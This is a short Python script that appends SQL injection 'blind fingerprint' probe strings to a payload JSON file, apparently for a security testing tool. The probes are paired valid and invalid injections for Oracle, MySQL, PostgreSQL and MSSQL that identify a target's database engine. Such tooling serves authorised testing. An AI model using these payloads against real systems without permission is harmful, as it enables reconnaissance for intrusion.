import json

with open('Data/Payloads/sqli_payloads.json', 'r') as f:
    d = json.load(f)

d['blind_fingerprint_probes'] = {
    'Oracle': {
        'valid': "xyz'||(SELECT '' FROM dual)||'",
        'bad':   "xyz'||(SELECT '' FROM not_a_real_table_xyzzy)||'",
    },
    'MySQL': {
        'valid': "xyz' AND (SELECT 1)='1",
        'bad':   "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)='1",
    },
    'PostgreSQL': {
        'valid': "xyz' AND (SELECT 1)::text='1",
        'bad':   "xyz' AND (SELECT 1 FROM not_a_real_table_xyzzy)::text='1",
    },
    'MSSQL': {
        'valid': "xyz' AND 1=(SELECT 1)--",
        'bad':   "xyz' AND 1=(SELECT 1 FROM not_a_real_table_xyzzy)--",
    }
}

with open('Data/Payloads/sqli_payloads.json', 'w') as f:
    json.dump(d, f, indent=2)

print("Added blind_fingerprint_probes to sqli_payloads.json")
